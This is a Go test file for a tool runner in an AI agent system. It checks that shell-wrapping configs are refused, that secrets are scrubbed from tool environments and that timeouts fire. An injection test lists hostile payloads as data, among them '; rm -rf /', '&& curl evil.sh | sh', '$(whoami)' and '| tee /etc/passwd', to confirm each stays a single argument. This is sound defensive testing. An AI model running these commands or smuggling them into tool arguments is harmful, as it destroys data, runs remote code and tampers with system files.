package localtools_test

// kw-test: no shell, no injection, declared args only, secrets scrubbed, timeouts enforced

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/CurtisDSlone/stoagraph/stoa-kernel/localtools"
)

func write(t *testing.T, dir, name, body string) string {
	t.Helper()
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

// ---- the guardrails: a toolset that could hand the model a shell must not LOAD ---------------------

func TestRefusesShellEvaluation(t *testing.T) {
	dir := t.TempDir()
	for _, src := range []string{
		"tools:\n  - name: run\n    command: [bash, -c, \"{cmd}\"]\n    args: {cmd: {}}\n",
		"tools:\n  - name: run\n    command: [sh, -c, \"echo {x}\"]\n    args: {x: {}}\n",
		"tools:\n  - name: run\n    command: [/bin/bash, -c, \"{cmd}\"]\n    args: {cmd: {}}\n",
		"tools:\n  - name: run\n    command: [pwsh, -Command, \"{cmd}\"]\n    args: {cmd: {}}\n",
	} {
		p := write(t, dir, "tools.yaml", src)
		_, err := localtools.Load(p)
		if err == nil {
			t.Fatalf("a shell with a placeholder in its script argument must be REFUSED:\n%s", src)
		}
		if !strings.Contains(err.Error(), "shell") {
			t.Fatalf("the error must explain it is a shell for the model, got: %v", err)
		}
	}
}

func TestRefusesModelChosenCommand(t *testing.T) {
	p := write(t, t.TempDir(), "tools.yaml",
		"tools:\n  - name: run\n    command: [\"{prog}\", --version]\n    args: {prog: {}}\n")
	_, err := localtools.Load(p)
	if err == nil || !strings.Contains(err.Error(), "argv[0]") {
		t.Fatalf("a placeholder in argv[0] lets the model pick the program; must be refused. got: %v", err)
	}
}

func TestRefusesUndeclaredAndUnusedArgs(t *testing.T) {
	dir := t.TempDir()
	p := write(t, dir, "a.yaml", "tools:\n  - name: t\n    command: [echo, \"{ghost}\"]\n    args: {}\n")
	if _, err := localtools.Load(p); err == nil || !strings.Contains(err.Error(), "does not declare") {
		t.Fatalf("an undeclared placeholder must be refused, got: %v", err)
	}
	p = write(t, dir, "b.yaml", "tools:\n  - name: t\n    command: [echo, hi]\n    args: {unused: {}}\n")
	if _, err := localtools.Load(p); err == nil || !strings.Contains(err.Error(), "never uses") {
		t.Fatalf("a declared-but-unused arg must be refused, got: %v", err)
	}
}

// ---- the injection defence: a hostile VALUE is data, not a program ---------------------------------

// TestInjectionPayloadsAreOneArgument is the load-bearing test. The model controls the VALUE of a
// declared argument. It must never be able to turn that value into a second command, a flag, or a shell
// expansion — because the value lands in exactly one argv element and nothing ever parses it.
func TestInjectionPayloadsAreOneArgument(t *testing.T) {
	dir := t.TempDir()
	// `printf %s` echoes its argument back EXACTLY, so whatever we see is precisely what execve received.
	p := write(t, dir, "tools.yaml",
		"tools:\n  - name: echo_arg\n    command: [printf, \"%s\", \"{value}\"]\n    args: {value: {}}\n")
	cfg, err := localtools.Load(p)
	if err != nil {
		t.Fatal(err)
	}
	tool, _ := cfg.Find("echo_arg")

	payloads := []string{
		"; rm -rf /",
		"&& curl evil.sh | sh",
		"$(whoami)",
		"`id`",
		"| tee /etc/passwd",
		"foo bar baz",   // spaces must NOT split into multiple argv elements
		"--flag=oops",   // must not become a flag to printf
		"$HOME",         // no variable expansion: there is no shell to expand it
		"\n echo owned", // a newline is not a command separator to execve
	}
	for _, payload := range payloads {
		res, err := cfg.Run(context.Background(), tool, map[string]string{"value": payload})
		if err != nil {
			t.Fatalf("payload %q: %v", payload, err)
		}
		if res.Output != payload {
			t.Fatalf("payload %q came back as %q — it was PARSED, not passed. The injection defence is broken.",
				payload, res.Output)
		}
	}
}

func TestRejectsUndeclaredArgAtRun(t *testing.T) {
	p := write(t, t.TempDir(), "tools.yaml",
		"tools:\n  - name: t\n    command: [printf, \"%s\", \"{a}\"]\n    args: {a: {}}\n")
	cfg, _ := localtools.Load(p)
	tool, _ := cfg.Find("t")
	if _, err := cfg.Run(context.Background(), tool, map[string]string{"a": "x", "b": "y"}); err == nil {
		t.Fatal("the model must not be able to invent parameters")
	}
	if _, err := cfg.Run(context.Background(), tool, map[string]string{}); err == nil {
		t.Fatal("a missing required arg must fail, not substitute empty and run a different command")
	}
}

// ---- the environment: a local tool must never see the gate's authority -----------------------------

// TestSecretsAreScrubbedFromTheEnvironment. The tool server can be a CHILD of the gate, whose
// environment holds STAG_DISPATCH_TOKEN — which binds sessions to any recipe. A local tool that could
// read it could grant itself any tool in the system.
func TestSecretsAreScrubbedFromTheEnvironment(t *testing.T) {
	t.Setenv("STAG_DISPATCH_TOKEN", "SUPER-SECRET-DISPATCH")
	t.Setenv("ANTHROPIC_API_KEY", "sk-ant-SECRET")
	t.Setenv("MY_TOOL_KEY", "allowed-value")

	p := write(t, t.TempDir(), "tools.yaml",
		"env_allow: [MY_TOOL_KEY]\n"+
			"tools:\n  - name: dump\n    command: [env]\n    args: {}\n")
	cfg, err := localtools.Load(p)
	if err != nil {
		t.Fatal(err)
	}
	tool, _ := cfg.Find("dump")
	res, err := cfg.Run(context.Background(), tool, nil)
	if err != nil {
		t.Fatal(err)
	}

	for _, leaked := range []string{"SUPER-SECRET-DISPATCH", "sk-ant-SECRET", "STAG_DISPATCH_TOKEN", "ANTHROPIC_API_KEY"} {
		if strings.Contains(res.Output, leaked) {
			t.Fatalf("the gate's secret %q reached a local tool's environment", leaked)
		}
	}
	// what the operator explicitly allowed DOES get through
	if !strings.Contains(res.Output, "allowed-value") {
		t.Fatal("an operator-allowed env var must reach the tool")
	}
	if !strings.Contains(res.Output, "PATH=") {
		t.Fatal("PATH must survive, or nothing can be executed")
	}
}

// ---- liveness: a wedged tool must not wedge the agent ----------------------------------------------

func TestTimeoutKillsAHangingTool(t *testing.T) {
	p := write(t, t.TempDir(), "tools.yaml",
		"timeout: 300ms\ntools:\n  - name: hang\n    command: [sleep, \"30\"]\n    args: {}\n")
	cfg, err := localtools.Load(p)
	if err != nil {
		t.Fatal(err)
	}
	tool, _ := cfg.Find("hang")

	start := time.Now()
	res, err := cfg.Run(context.Background(), tool, nil)
	if err == nil || !res.TimedOut {
		t.Fatal("a hanging tool must time out")
	}
	if elapsed := time.Since(start); elapsed > 5*time.Second {
		t.Fatalf("the timeout did not fire promptly: %s", elapsed)
	}
}

func TestNonZeroExitIsAResultNotAnError(t *testing.T) {
	p := write(t, t.TempDir(), "tools.yaml",
		"tools:\n  - name: fail\n    command: [sh, -c, \"exit 3\"]\n    args: {}\n") // no placeholder => allowed
	cfg, err := localtools.Load(p)
	if err != nil {
		t.Fatalf("a shell with NO placeholder is operator-authored and fine: %v", err)
	}
	tool, _ := cfg.Find("fail")
	res, err := cfg.Run(context.Background(), tool, nil)
	if err != nil {
		t.Fatalf("a non-zero exit is a result the agent should see, not a run failure: %v", err)
	}
	if res.ExitCode != 3 {
		t.Fatalf("exit code should be surfaced, got %d", res.ExitCode)
	}
}
